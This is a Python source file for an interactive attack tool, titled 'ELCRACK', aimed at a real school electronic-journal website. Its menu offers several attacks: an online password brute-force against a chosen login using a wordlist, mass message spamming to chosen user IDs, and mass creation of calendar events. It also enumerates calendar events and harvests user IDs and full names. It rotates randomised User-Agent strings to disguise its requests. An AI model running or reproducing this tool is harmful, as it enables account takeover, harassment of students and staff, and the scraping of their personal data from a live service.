import requests
from bs4 import BeautifulSoup
import random
import os
import time
import json
import re

BASE = "https://eljur.gospmr.org"
# logo
logo = r"""
███████╗ ██╗      ██████╗ ██████╗   █████╗  ██████╗ ██╗  ██╗
██╔════╝ ██║     ██╔════╝ ██╔══██╗ ██╔══██╗ ██╔════╝ ██║ ██╔╝
█████╗   ██║     ██║      ██████╔╝ ███████║ ██║      █████═╝ 
██╔══╝   ██║     ██║      ██╔══██╗ ██╔══██║ ██║      ██╔═██╗ 
███████╗ ███████╗╚██████╗ ██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗
╚══════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝
"""

login = ""
password = ""
domain = ""

session = requests.Session()


# функция измены ссесии
def ses_update():
    session.headers.update({
        "User-Agent": (
            f"Mozilla/{random.randint(2, 5)}.0 (Linux {random.randint(1, 1000000)}; Android {random.randint(1, 1000000)}); CPH2841) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{random.randint(70, 126)}.0.0.0 Mobile Safari/{random.randint(20, 537)}.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Origin": BASE,
        "Referer": f"{BASE}/authorize",

})


ses_update()

# функция получение html от url
def get_soup(url):
    r = session.get(url)
    r.encoding = "utf-8"
    return BeautifulSoup(r.text, "html.parser")

# функция регистрации элжура в ссесии (надо проверить работу)
def reg(login_val, password_val):
    global domain
    data = {
        "username": login_val,
        "password": password_val,
        "return_uri": "/",
    }
    try:
        response = session.post(f"{BASE}/ajaxauthorize", data=data)
        if response.text == r"""{"actions":[],"errors":[{"field":null,"text":"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043b\u043e\u0433\u0438\u043d \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c"}],"result":false}""":
            return "Неверный логин или пароль"
        elif r""""result":true""" in str(response.text):
            domain = json.loads(
                str(json.loads(str(response.text))["actions"]).replace("[", "").replace("]", "").replace("'", '"'))[
                "url"].replace(f"/?user={login_val}&domain=", "")
            return "ok"
        else:
            return response.text
    except Exception as e:
        return e


# функция создания календаря
def newcal(title="Новое событие", canEdit=True, description="Описание события", calendar_id="99999999",
           datetime_start="2026-10-31 09:00:00", datetime_end="2026-10-31 10:00:00", presence="at_will",
           place_type="school", place_value="", status="published"):
    data = {
        "CalendarEvent": {
            "title": title,
            "canEdit": canEdit,
            "description": description,
            "calendar_id": calendar_id,
            "datetime_start": datetime_start,
            "datetime_end": datetime_end,
            "presence": presence,
            "place_type": place_type,
            "place_value": place_value,
            "status": status
        }
    }
    response = session.post(f"{BASE}/journal-calendar-api-action/type.event/action.create", json=data)
    return response.text


# функция отправки сообщения
def go_mess(id_in, description, tema, csrf):
    data = {
        "subject": tema,
        "message": description,
        "receivers": id_in,
        "vfiles": [],
        "csrf": csrf,
        "resources": ""
    }
    response = session.post(f"{BASE}/journal-messages-send-action", json=data)
    print(response.text)


# функция получение календаря по его счёту
def razved_cal(iddd):
    return session.get(
        f"https://eljur.gospmr.org/journal-calendar-api-action/type.event/action.one?id={iddd}").text.encode(
        'utf-8').decode('unicode_escape')

# функция интерфейса для введения логина и пароля
def login_password():
    global login, password
    while True:
        print(logo)
        print("\n                  ВВЕДИТЕ ЛОГИН\n")
        login = input("login>>  ")
        password = input("password>>  ")
        pp = reg(login, password)
        if pp == "ok":
            break
        elif pp == "Неверный логин или пароль":
            print("\n  Неверный логин или пароль")
            time.sleep(2)
            os.system("clear")
            continue
        else:
            print(f"\n  ошибка  {pp}")
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()


# функция интерфейса меню (не доделана)
def menu():
    global domain
    while True:
        print(logo)
        print(
            f"\n                  ВВЕДИТЕ НОМЕР ДЕЙСТВИЯ      domain={domain}\n\n  1)message boom\n  2)scan calendar\n  3)calendar boom\n  4)brute online\n  5)userid scan\n  99)exit")
        go = input(" >>   ")
        if go == "1":
            os.system('cls' if os.name == 'nt' else 'clear')
            message_go()
        elif go == "2":
            os.system('cls' if os.name == 'nt' else 'clear')
            calendar_scan()
        elif go == "3":
            os.system('cls' if os.name == 'nt' else 'clear')
            calendar_go()
        elif go == "4":
            os.system('cls' if os.name == 'nt' else 'clear')
            brute_online()
        elif go == "5":
            os.system('cls' if os.name == 'nt' else 'clear')
            userid_scan()
        elif go == "99":
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        else:
            print(f"\n         ВВЕДИТЕ КОРЕКТНЫЙ НОМЕР")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')
            continue


# функция интерфейса для отправки сообщения
def message_go():
    print(logo)
    print("\n                  Вы выбрали message boom\n")
    reg(login, password)
    n = int(input("n>>  "))
    id = {}
    for i in range(1, n + 1):
        id[str(n)] = str(input(f"id_{i}>>  "))
    desc = input("description>>  ")
    tit = input("title>>  ")
    nn = int(input("N>>  "))
    dd = get_soup(f"{BASE}/journal-messages-compose-action")
    csrf = dd.find("input", id="csrf")["value"]
    for i in range(1, nn + 1):
        for i in id:
            go_mess([id[str(i)]], desc, tit, csrf)
            print(f"Сообщение {nn} для {id[str(i)]} было отправленно")
    print("Готово!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()

# функция интерфейса для сканирование календарей
def calendar_scan():
    print(logo)
    print("\n                  Вы выбрали scan calendar\n")
    min = int(input("min>>  "))
    max = int(input("max>>  "))
    log_file = input("log_file>>  ")
    reg(login, password)
    with open(log_file, "w", encoding="utf-8", errors="ignore") as f:
        while min <= max:
            try:
                razvedjson = json.loads(str(razved_cal(min)))
                if razvedjson != {'result': False, 'error': 'Событие не найдено', 'formErrors': None}:
                    razvedjson = razvedjson["result"][str(min)]
                    f.write(f'{min}:\nheader: {razvedjson["header"]}\ntitle: {razvedjson["title"]}\naudience: {razvedjson["audience"]}\ncorner: {razvedjson["corner"]}\ncolor: {razvedjson["color"]}\ncanEdit: {razvedjson["features"]["canEdit"]}\nlabel: {razvedjson["label"]}\ncalendar_id: {razvedjson["payload"]["calendar_id"]}\ntitle_payload: {razvedjson["payload"]["title"]}\ndescription: {razvedjson["payload"]["description"]}\nowner_uid: {razvedjson["payload"]["owner_uid"]}\nstatus: {razvedjson["payload"]["status"]}\ndatetime_start: {razvedjson["payload"]["datetime_start"]}\ndatetime_end: {razvedjson["payload"]["datetime_end"]}\nresponsible_uid: {razvedjson["payload"]["responsible_uid"]}\ncreated_at: {razvedjson["payload"]["created_at"]}\nupdated_at: {razvedjson["payload"]["updated_at"]}\npresence: {razvedjson["payload"]["presence"]}\nparent_event_id: {razvedjson["payload"]["parent_event_id"]}\nplace_type: {razvedjson["payload"]["place_type"]}\nurl: {razvedjson["payload"]["url"]}\nroom: {razvedjson["payload"]["room"]}\nroom_id: {razvedjson["payload"]["room_id"]}\naddress: {razvedjson["payload"]["address"]}\nresult: {razvedjson["payload"]["result"]}\naudience: {razvedjson["payload"]["audience"]}\nud_type: {razvedjson["payload"]["ud_type"]}\noptions: {razvedjson["payload"]["options"]}\nview_access: {razvedjson["payload"]["view_access"]}\neventCalendar: {razvedjson["payload"]["eventCalendar"]}\ninviteList: {razvedjson["payload"]["inviteList"]}\npv_shooting_required: {razvedjson["payload"]["pv_shooting_required"]}\ntech_spec_required: {razvedjson["payload"]["tech_spec_required"]}\nowner: {razvedjson["payload"]["owner"]}\nplace_value: {razvedjson["payload"]["place_value"]}\npeople: {razvedjson["payload"]["responsible"]}\n\n')
                    print(f"{min} готов")
                else:
                    print(f"{min} нету")
            except json.decoder.JSONDecodeError:
                f.write(f"{razved_cal(min)}\n\n")
                print(f"{min} неподлежит обработке, записан полный json")
            min += 1
        f.close()
    print("Готово!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()


# функция интерфейса для публикации календарей
def calendar_go():
    print(logo)
    print("\n                  Вы выбрали calendar boom\n")
    date_start = input("date_start(данные тип: 2000-12-31 23:59:59)>>  ")
    date_end = input("date_end(данные типа: 2000-12-31 23:59:59)>>  ")
    title = input("title>>  ")
    canEdit = input("canEdit(да или нет)>>  ")
    description = input("description>>  ")
    calendar_id = input("calendar_id>>  ")
    presence = input("presence>>  ")
    place_type = input("place_type>>  ")
    place_value = input("place_value>>  ")
    status = input("status>>  ")
    N = int(input("N>>  "))
    reg(login, password)
    g = 1
    while g <= N:
        print(f'Созданно событие {g}:\n{newcal(title=title, canEdit=True if canEdit == "да" else False, description=description, calendar_id=calendar_id, datetime_start=date_start, datetime_end=date_end, presence=presence, place_type=place_type, place_value=place_value, status=status)}\n')
        g += 1
    print("Готово!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()

# функция интерфейса для перебора паролей
def brute_online():
    gg_stabilizator = False
    print(logo)
    print("\n                  Вы выбрали brute online\n")
    login = input("login>>  ")
    brute_file = input("brute_file>>  ")
    N = 0
    get_soup(f"{BASE}/journal-user-logout-action")
    with open(brute_file, "r", encoding='utf-8') as f:
        for line in f:
            pp = reg(login, line.strip())
            if pp == "ok":
                print(f"СОВПАДЕНИЕ НАЙДЕННО: {login}, {line.strip()}\n Нажмите enter")
                input()
                gg_stabilizator = True
                break
            elif pp == "Неверный логин или пароль":
                print(f"{N})Неподходит:   {login}, {line.strip()}")
            N += 1
        if gg_stabilizator == False:
            print(f"Нету подходящих паролей к {login}")
    print("Готово!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()

# функция интерфейса для разведки userid
def userid_scan():
    print(logo)
    print("\n                  Вы выбрали userid scan\n")
    #log_file = input("log_file>>  ")
    #with open(log_file, "r", encoding='utf-8') as f:
    dd = json.loads(str(get_soup(f"{BASE}/journal-api-messages-action?method=messages.get_list&category=inbox&search=&limit=00&offset=0&teacher=0&status=&companion=&minDate=0")))
    n = 0
    legit_check = ""
    while n <= len(dd):
        pp = get_soup(f"{BASE}/journal-messages-view-action?item={dd["list"][n]["id"]}")
        match = re.search(r"var allReceivers\s*=\s*(\[.*?\]);", str(pp), re.DOTALL)
        receivers = json.loads(match.group(1))
        for r in receivers:
            if f"i{r["uid"]}" not in legit_check:
            	print(f"{r["uid"]}-{r["full_fio"].replace(" ", "-")}")
            	legit_check = f"{legit_check}i{r["uid"]}"
        n += 1
    print("Готово!")
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()

# вызов функции интерфейса, начало работы
login_password()